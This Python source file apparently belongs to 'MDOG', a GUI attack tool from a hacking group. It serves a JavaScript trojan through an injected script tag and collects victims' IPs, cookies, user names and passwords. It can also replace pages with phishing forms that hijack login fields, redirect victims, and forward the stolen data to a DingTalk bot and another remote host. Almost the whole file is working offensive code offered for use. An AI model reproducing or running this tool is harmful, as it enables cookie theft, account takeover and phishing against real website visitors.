import sys
sys.path.insert(0, './')
import socket
from PySide2.QtWidgets import QApplication, QMessageBox,QTableWidgetItem
from PySide2.QtUiTools import QUiLoader
from pack.DingTalkPush import DingTalk
from PyQt5.QtWidgets import QFileDialog
import base64
import threading
import requests
import json
import re

VERSION = "MDOG v1.2.0 @by Maptnh from S-H4CK13"

class PubDATA:
    mainWin = None


class Win_Main:
    def __init__(self):
        self.LOCK = False
        self.LOOP_STOP_MODE = False
        self.ui = QUiLoader().load('Main.ui')
        # 钉钉推送 模块载入
        self.DingTalk = DingTalk(False)

        # MDOG 主服务载入
        self.MDOG = MDOG(self.ui,self.DingTalk)

        # self.DingTalk._chs()
        self.ui.Stop.setEnabled(False)

        # 将数据推送到其他主机复选框勾选
        self.ui.Push_Data.clicked.connect(lambda:self.__push_data(self.ui.Push_Target.text()))

        # 重定向复选框勾选
        self.ui.Redirect.clicked.connect(lambda:self.__redirect(self.ui.B_Redirect.text()))

        # 钉钉推送复选框勾选    token 加签 数据
        self.ui.DingTalk_Push.clicked.connect(lambda:self.__dingtalk(self.ui.DingTalk_Token.text(),self.ui.DingTalk_Secret.text(),VERSION))

        # Phishing复选框勾选
        self.ui.Phishing.clicked.connect(lambda:self.__hijack(self.ui.Button_ID.text(),self.ui.User_ID.text(),self.ui.Password_ID.text(),self.ui.Phishing_Page.text()))

        # Phishing页面选择
        self.ui.P_File.clicked.connect(self.__open_file_dialog)

        # 结果输出 初始化
        self.__out_table_init()

        # 服务端信息输出 初始化
        self.__out_table_init_server()

        # 服务映射
        self.ui.Server_Mapping.clicked.connect(lambda:self.__server_mapping(self.ui.Mapping_IP_Server.text()))

        # 刷新payload
        self.ui.flush_payload.clicked.connect(lambda:self.__flush_payload())

        # 运行
        self.ui.Exploit.clicked.connect(lambda:self.__run(self.ui.Local_Host.text(),self.ui.Local_Port.text()))

        # 停止
        self.ui.Stop.clicked.connect(lambda:self.__stop())
        self.ui.Local_Host.setText(self.__myip())
        self.ui.Local_Port.setText("10000")

        # Payload载入
        self.__flush_payload()



# 输出框
    def __out_table_init_server(self):
        columns = ['推送目标', '状态']
        self.__init_table(self.ui.Server_Info, columns)

    def __add_data_to_out_table_server(self, lists):
        self.add_data_to_table(self.ui.Server_Info, lists)

    def __out_table_init(self):
        columns = ['IP', '主机类型', '来源地址', 'Cookie', '网络类型','时间','行为', '用户名', '密码']
        self.__init_table(self.ui.Output_Result, columns)

    def __add_data_to_out_table(self, lists):
        self.add_data_to_table(self.ui.Output_Result, lists)

    def __init_table(self, table, columns):
        column_size = table.columnCount()
        for i, column in enumerate(columns):
            table.insertColumn(column_size)
            item = QTableWidgetItem(column)
            table.setHorizontalHeaderItem(i, item)
            column_size += 1

    def add_data_to_table(self, table, data):
        row_count = table.rowCount()
        table.setRowCount(row_count + 1)
        for i, val in enumerate(data):
            item = QTableWidgetItem(str(val))
            table.setItem(row_count, i, item)
        table.scrollToBottom()

# ------------------

# 钓鱼页面打开文件

    def __open_file_dialog(self):
        file_dialog = QFileDialog()
        file_name, _ = file_dialog.getOpenFileName(None, "选择文件", "", "HTML 文件 (*.html)")
        if file_name:
            self.ui.Phishing_Page.setText(file_name)


# 钉钉模块
    def __dingtalk(self,token,secret,data):
        if self.ui.DingTalk_Push.isChecked():
            if token and secret.startswith("SEC") and data:
                self.ui.DingTalk_Token.setEnabled(False)
                self.ui.DingTalk_Secret.setEnabled(False)
                self.DingTalk.set_token(token)
                self.DingTalk.set_secret(secret)
                self.DingTalk.send_text(data)
            else:
                self.ui.DingTalk_Push.setChecked(False)
                self.pop_window("参数不正确!","钉钉推送模块加载错误!")
        else:
                self.ui.DingTalk_Token.setEnabled(True)
                self.ui.DingTalk_Secret.setEnabled(True)


# 重定向模块
    def __redirect(self,url):
        if self.ui.Redirect.isChecked():
            if url.startswith("http"):
                self.ui.B_Redirect.setEnabled(False)
            else:
                self.ui.Redirect.setChecked(False)
                self.pop_window("参数不正确!","重定向模块加载错误!")
        else:
            self.ui.B_Redirect.setEnabled(True)


# 表单劫持模块
    def __hijack(self,button_id,user_id,password_id,file_path):
        if self.ui.Phishing.isChecked():
            if button_id and user_id and password_id and file_path:
                self.ui.Password_ID.setEnabled(False)
                self.ui.Button_ID.setEnabled(False)
                self.ui.User_ID.setEnabled(False)
                self.ui.Phishing_Page.setEnabled(False)
                self.ui.P_File.setEnabled(False)


            else:
                self.ui.Phishing.setChecked(False)
                self.pop_window("参数不正确!","网络钓鱼模块加载错误!")
        else:
            self.ui.Password_ID.setEnabled(True)
            self.ui.Button_ID.setEnabled(True)
            self.ui.User_ID.setEnabled(True)
            self.ui.Phishing_Page.setEnabled(True)
            self.ui.P_File.setEnabled(True)


# 服务映射
    def __server_mapping(self,url):
        if self.ui.Server_Mapping.isChecked():
            if url.startswith("http"):
                self.ui.Mapping_IP_Server.setEnabled(False)
            else:
                self.ui.Server_Mapping.setChecked(False)
                self.pop_window("参数不正确!","映射模块加载错误!")
        else:
            self.ui.Mapping_IP_Server.setEnabled(True)

# 数据共享模块
    def __push_data(self,url):
        if self.ui.Push_Data.isChecked():
            if url.startswith("http"):
                self.ui.Push_Target.setEnabled(False)
            else:
                self.ui.Push_Data.setChecked(False)
                self.pop_window("参数不正确!","数据共享模块加载错误!")
        else:
            self.ui.Push_Target.setEnabled(True)

# 刷新payload
    def __flush_payload(self):
        self.ui.payload.setText("<script src=\""+str(self.ui.Server_Mapping.isChecked() and self.ui.Mapping_IP_Server.text() or 'http://' +self.ui.Local_Host.text()+ ':'+str(self.ui.Local_Port.text()))+"/Main.js\"></script>")



# 弹窗模块
    def pop_window(self,Title,Message):
        QMessageBox.warning(self.ui,Title,Message)

# 获取本地IP

    def __myip(self):
        return socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)[0][4][0]

# 运行服务
    def __run(self,ip,port):
        if ip and port:
            self.ui.Local_Host.setEnabled(False)
            self.ui.Local_Port.setEnabled(False)
            self.ui.Stop.setEnabled(True)
            self.ui.Exploit.setEnabled(False)
            self.MDOG.start_server()


            self.MDOG.run_server(ip,port)
        else:
            self.ui.Local_Host.setEnabled(True)
            self.ui.Local_Port.setEnabled(True)
            self.pop_window("错误!","你没有正确填写服务所需要的参数！")

# 停止服务

    def __stop(self):
        self.ui.Local_Host.setEnabled(True)
        self.ui.Local_Port.setEnabled(True)
        self.ui.Exploit.setEnabled(True)
        self.ui.Stop.setEnabled(False)
        try:
            self.MDOG.stop_server()
        except Exception as e:
            self.pop_window("异常!","服务关闭失败!")
        else:
            self.pop_window("提示!","服务成功关闭!")



class MDOG(Win_Main):
    def __init__(self,ui,dingtalk):
        self.stop_event = threading.Event()
        self.ui = ui
        self.dingtalk = dingtalk
    def run_server(self,ip,port):
        self.start_server()
        super().pop_window("提示！","服务端成功启动!")
        self.Basic_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.Basic_SOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.Basic_SOCK.bind(('', int(port)))
        self.Basic_SOCK.listen(100)
        threading.Thread(
                        target=self.Basic_Waitting_for_user
                    ).start()


    def Basic_Waitting_for_user(self):
        while not self.stop_event.is_set():
            try:
                Client_Socket, User_INFO = self.Basic_SOCK.accept()
            except Exception as e:
                continue
            else:
                threading.Thread(target=self.Service_user, args=(Client_Socket,)).start()

    def Service_user(self,Client_Socket):
        try:
            DATA = Client_Socket.recv(1024).decode('utf-8')
        except Exception as e:
            self.Basic_SOCK.close()
            return False
        else:
            # 判断访问的是什么
            Stat_code = self.Judgment_type(DATA)
            if Stat_code==0: # Mian.js
                JS_File_Code = self.Handle_JS_Script_message()
                Client_Socket.send(JS_File_Code)
            elif Stat_code == 1: # 客户数据
                self.Get_User_Information_And_Display(DATA)
            elif Stat_code == 2: # 首页
                Index_Page = self.Send_Index_page()
                Client_Socket.send(Index_Page)
            elif Stat_code == 4:# /Web.js 钓鱼
                if self.ui.Phishing.isChecked():
                    Client_Socket.send(self.Send_Web_JS())
            Client_Socket.close()

    def Judgment_type(self, DATA):
        if "GET /Main.js" in DATA:
            return 0
        elif "{" in DATA and "/JSONDATA" in DATA:
            return 1
        else:
            return 2
# 停止服务
    def stop_server(self):
        self.stop_event.set()
        self.Basic_SOCK.close()

    def start_server(self):
        self.stop_event.clear()


# JS木马文件
    def Handle_JS_Script_message(self):
        Head = "HTTP/1.1 200 OK\r\n"
        with open('./Main.js', 'r',encoding='utf-8') as f:
            Note = f.read()
        Note = Note.replace("@IPCONFIG",base64.b64encode((self.ui.Server_Mapping.isChecked() and self.ui.Mapping_IP_Server.text() or 'http://' +self.ui.Local_Host.text()+ ':'+str(self.ui.Local_Port.text())).encode('utf-8')).decode('utf-8'),1)

        # 决定是否注入页面程序
        if self.ui.Phishing.isChecked() and self.ui.Phishing_Page.text():
            Note=Note.replace('@Web',"True",1)
            Note=Note.replace('null',self.read_file(self.ui.Phishing_Page.text()).replace('\n',''),1)

        # 表单劫持
        if self.ui.Phishing.isChecked() and self.ui.Button_ID.text() and self.ui.User_ID.text() and self.ui.Password_ID.text():
            Note = Note.replace("@Button",self.ui.Button_ID.text(),1)
            Note = Note.replace("@User_Name_key", self.ui.User_ID.text(),1)
            Note = Note.replace("@Password_Key", self.ui.Password_ID.text(),1)
        # 重定向选项
        if self.ui.Redirect.isChecked() and self.ui.B_Redirect.text():
            Note = Note.replace("@Rd_Path", f"window.location.href=\"{self.ui.B_Redirect.text()}\"",1)
        else:
            Note = Note.replace("@IP_PORT",'Null',1)

        Head += f"content-length:{len(Note)}\r\n\r\n"+Note
        return Head.encode('utf-8')




# 发送首页
    def Send_Index_page(self):
            with open('./index.html','r',encoding='utf-8')as f:
                Code = f.read()
            Head = "HTTP/1.1 200 OK\r\n"
            Head += f"content-length:{len(Code)}\r\n\r\n"+Code
            return Head.encode('utf-8')

# 显示
    def Get_User_Information_And_Display(self, DATA,Flag=False):
        res = list()
        User_INFO = json.loads(re.search(r'{(.*?)}', DATA).group())
        for Key, Value in User_INFO.items():
            res.append(self.Decrypt(User_INFO[Key]))
        super().add_data_to_table(self.ui.Output_Result,res)
        if self.ui.DingTalk_Push.isChecked() and self.ui.DingTalk_Secret.text() and self.ui.DingTalk_Token.text():
            self.dingtalk.send_text(str(res))
        if self.ui.Push_Data.isChecked() and self.ui.Push_Target.text():
            try:
                requests.post(self.ui.Push_Target.text(),data=str(res),timeout=1)
            except Exception as e:
                pass
            finally:
                super().add_data_to_table(self.ui.Server_Info, [self.ui.Push_Target.text(),'200'])

# 解码
    def Decrypt(self,str):
        try:
            str=base64.b64decode(str).decode("utf-8")
        except:
            pass
        return str

# 读钓鱼文件
    def read_file(self,file):
        with open(file,'r',encoding='utf-8')as f:
            code = f.read()
        return code

def main():
    app = QApplication([])
    PubDATA.mainWin = Win_Main()
    PubDATA.mainWin.ui.show()
    app.exec_()


if __name__ == '__main__':
    main()
